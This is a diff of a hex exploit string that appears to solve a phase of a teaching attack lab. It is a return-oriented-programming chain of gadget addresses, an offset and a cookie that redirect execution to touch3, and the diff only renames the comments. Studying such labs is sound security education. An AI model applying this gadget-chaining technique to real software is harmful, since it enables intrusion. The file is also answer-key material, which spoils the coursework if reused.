@@ -3,14 +3,14 @@
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-06 1a 40 00 00 00 00 00    /* mov %rsp,%rax */
-a2 19 40 00 00 00 00 00    /* mov %rax,%rdi */
-cc 19 40 00 00 00 00 00    /* pop %rax */
-48 00 00 00 00 00 00 00    /* add 0x48 to %rdi */
-dd 19 40 00 00 00 00 00    /* mov %eax,%edx */
-69 1a 40 00 00 00 00 00    /* mov %edx,%ecx */
-13 1a 40 00 00 00 00 00    /* mov %ecx,%esi */
-d6 19 40 00 00 00 00 00    /* add_xy */
-a2 19 40 00 00 00 00 00	   /* mov %rax,%rdi */
+06 1a 40 00 00 00 00 00    /* gadget 1 : mov %rsp,%rax */
+a2 19 40 00 00 00 00 00    /* gadget 2 : mov %rax,%rdi */
+cc 19 40 00 00 00 00 00    /* gadget 3 : pop %rax */
+48 00 00 00 00 00 00 00    /* the offset */
+dd 19 40 00 00 00 00 00    /* gadget 4 : mov %eax,%edx */
+69 1a 40 00 00 00 00 00    /* gadget 5 : mov %edx,%ecx */
+13 1a 40 00 00 00 00 00    /* gadget 6 : mov %ecx,%esi */
+d6 19 40 00 00 00 00 00    /* gadget 7 : add_xy */
+a2 19 40 00 00 00 00 00	   /* gadget 8 : mov %rax,%rdi */
 fa 18 40 00 00 00 00 00    /* return to touch3 */
 35 39 62 39 39 37 66 61    /* cokie */
